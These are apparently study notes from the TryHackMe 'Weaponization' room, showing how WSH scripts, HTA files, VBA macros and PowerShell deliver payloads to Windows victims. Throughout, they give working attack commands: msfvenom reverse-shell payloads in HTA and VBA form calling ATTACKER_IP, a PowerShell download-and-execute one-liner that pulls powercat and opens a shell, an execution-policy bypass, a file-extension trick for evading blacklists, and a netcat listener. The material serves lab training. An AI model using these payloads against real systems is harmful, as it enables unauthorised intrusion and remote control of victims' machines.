# Weaponization

## TASK 3: Windows Scripting Host (WSH)

Windows scripting host is a built-in Windows tool that runs batch files to automate tasks. It uses `cscript.exe` (command-line scripts) and `wscript.exe` (UI scripts) to execute VBScript files like `.vbs` and `.vbe`. Scripts run with the same permissions as the user, making it useful for red teamers.

### Example 1: Create a Message Box
```vbscript
Dim message 
message = "Welcome to THM"
MsgBox message
```
Save this as `hello.vbs` and run it with:
```cmd
c:\Windows\System32>wscript c:\Users\thm\Desktop\hello.vbs
```

### Example 2: Run an Executable
```vbscript
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
```
Save this as `payload.vbs` and execute it:
```cmd
c:\Windows\System32>wscript c:\Users\thm\Desktop\payload.vbs
c:\Windows\System32>cscript.exe c:\Users\thm\Desktop\payload.vbs
```

If `.vbs` files are blacklisted, rename to `.txt` and run:
```cmd
c:\Windows\System32>wscript /e:VBScript c:\Users\thm\Desktop\payload.txt
```

---

## TASK 4: An HTML Application (HTA)

HTA (HTML Application) files are dynamic HTML pages with JScript or VBScript. They can be executed using the LOLBIN tool `mshta`, either directly or via Internet Explorer.

### Example: Execute `cmd.exe`
```html
<html>
<body>
<script>
    var c= 'cmd.exe';
    new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```
Serve the `payload.hta` from a web server:
```bash
python3 -m http.server 8090
```
On the victim machine, visit the malicious link using Microsoft Edge: `http://ATTACKER_IP:8090/payload.hta`. Once "Run" is pressed, the payload executes.

### HTA Reverse Connection
Generate a reverse shell payload:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f hta-psh -o thm.hta
```
Set up a listener on port 443 using `nc`. When the victim visits the malicious URL, a connection is established.

---

## TASK 5: Visual Basic for Applications (VBA)

VBA is a Microsoft programming language for automating tasks in Office applications like Word and Excel. Macros in VBA can automate processes and access low-level Windows functionality.

### Example 1: Display a Message Box
```vba
Sub THM()
    MsgBox ("Welcome to Weaponization Room!")
End Sub
```
Run the macro using `F5` or `Run → Run Sub/UserForm`.

### Example 2: Run an Executable
```vba
Sub PoC()
    Dim payload As String
    payload = "calc.exe"
    CreateObject("Wscript.Shell").Run payload,0
End Sub
```
Save the file as a Macro-Enabled format (`.doc` or `.docm`). Enable macros when reopening the document to execute the code.

### Reverse Shell Payload
Generate a payload:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f vba
```
Modify the output to use `Document_Open()` for Word documents. Copy the payload into the macro editor.

---

## TASK 6: PowerShell (PSH)

PowerShell is an object-oriented programming language executed from the Dynamic Language Runtime (DLR) in .NET. Red teamers rely on PowerShell for various activities, including initial access and system enumeration.

### Example: Print a Message
```powershell
Write-Output "Welcome to the Weaponization Room!"
```
Save the file as `thm.ps1` and run it:
```cmd
powershell -File thm.ps1
```

### Execution Policy
PowerShell's execution policy protects the system from running malicious scripts. By default, it is set to `Restricted`. Change it with:
```powershell
Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
```
Bypass the policy with:
```cmd
powershell -ex bypass -File thm.ps1
```

### Reverse Shell with Powercat
Download `powercat` from GitHub and host it via a web server:
```bash
git clone https://github.com/besimorhino/powercat.git
cd powercat
python3 -m http.server 8080
```
On the victim machine, download and execute the payload:
```cmd
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
```

---

## TASK 9: Practical Steps

1. **Create Payload**
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f hta-psh -o thm.hta
   ```
2. **Set Up Server**
   ```bash
   python3 -m http.server 456
   ```
3. **Victim Downloads Payload**
   ```
   http://ATTACKER_IP:456/thm.hta
   ```
4. **Set Up Listener**
   ```bash
   nc -lnvp 443
   ```
5. **Find Flag**
   Locate the flag on the victim's desktop.

---

## Appendix

Refer to the TryHackMe room for more details on these techniques.